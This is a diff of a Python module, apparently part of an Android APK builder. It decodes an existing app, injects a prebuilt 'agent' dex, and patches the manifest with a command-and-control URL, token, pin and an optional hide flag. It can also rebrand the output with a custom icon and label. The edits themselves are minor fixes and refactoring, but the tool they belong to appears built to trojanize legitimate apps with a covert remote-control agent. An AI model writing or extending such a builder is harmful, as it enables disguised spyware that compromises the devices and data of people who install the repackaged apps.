@@ -3,6 +3,7 @@ from __future__ import annotations
 
 import asyncio
 import hashlib
+import re
 import secrets
 import shutil
 import subprocess
@@ -28,10 +29,10 @@ def _apktool() -> str:
     return tool
 
 
-def _run(args: list[str], cwd: Path | None = None, timeout: int = 1200) -> None:
+def _run(args: list[str], cwd: Path | None = None, timeout: int = 1800) -> None:
     proc = subprocess.run(args, cwd=cwd, capture_output=True, timeout=timeout)
     if proc.returncode != 0:
-        tail = (proc.stderr or proc.stdout or b"")[-1200:].decode(errors="replace")
+        tail = (proc.stderr or proc.stdout or b"")[-1500:].decode(errors="replace")
         raise RuntimeError(f"{Path(args[0]).name} gagal: {tail}")
 
 
@@ -52,6 +53,8 @@ def decode(apk: Path, work: Path, log: Log) -> Path:
     decoded = work / "decoded"
     log("apktool decode...")
     _run([_apktool(), "d", "-f", "-o", str(decoded), str(apk)])
+    if not (decoded / "AndroidManifest.xml").exists():
+        raise RuntimeError("hasil decode tanpa AndroidManifest.xml")
     return decoded
 
 
@@ -84,22 +87,28 @@ def sha256(path: Path) -> str:
 
 def _prepare(decoded: Path, opts: dict) -> int:
     """Injeksi dex + resource + manifest. Kembalikan jumlah dex."""
+    has_icon = bool(opts.get("icon"))
+    has_label = bool(opts.get("label"))
+
     n = injector.inject_dex(decoded, prebuilt(AGENT_APK))
     injector.inject_assets(decoded)
-    injector.patch_manifest(
-        decoded,
-        opts["c2_url"], opts["token"], opts["pin"],
-        opts["email"], opts["team"], bool(opts.get("hide")),
-    )
-    if opts.get("icon"):
+
+    if has_icon:
         branding.write_icons(Path(opts["icon"]).read_bytes(), decoded / "res")
     if opts.get("wallpaper"):
         branding.write_wallpaper(Path(opts["wallpaper"]).read_bytes(), decoded / "res")
-    if opts.get("label"):
+    if has_label:
         branding.patch_strings(
             decoded / "res" / "values" / "mzk_strings.xml",
             opts["label"], opts.get("wizard", ""), opts["email"], opts["team"],
         )
+
+    injector.patch_manifest(
+        decoded,
+        opts["c2_url"], opts["token"], opts["pin"],
+        opts["email"], opts["team"], bool(opts.get("hide")),
+        has_label, has_icon,
+    )
     return n
 
 
@@ -120,7 +129,9 @@ async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> 
     out = config.BUILD_DIR / f"{build_id}.apk"
 
     try:
-        if mode == "patch" and source is not None:
+        if mode == "patch":
+            if source is None:
+                raise RuntimeError("mode patch tanpa file sumber")
             decoded = await loop.run_in_executor(None, decode, source, work, log)
         else:
             base = prebuilt(TEMPLATE_APK)
@@ -174,11 +185,9 @@ def inspect_apk(path: Path) -> dict:
     try:
         proc = subprocess.run(
             [_apktool(), "d", "-s", "-f", "-o", str(tmp / "d"), str(path)],
-            capture_output=True, timeout=180,
+            capture_output=True, timeout=240,
         )
         if proc.returncode == 0:
-            import re
-
             mf = (tmp / "d" / "AndroidManifest.xml").read_text(errors="replace")
             m = re.search(r'package="([^"]+)"', mf)
             v = re.search(r'versionName="([^"]*)"', mf)
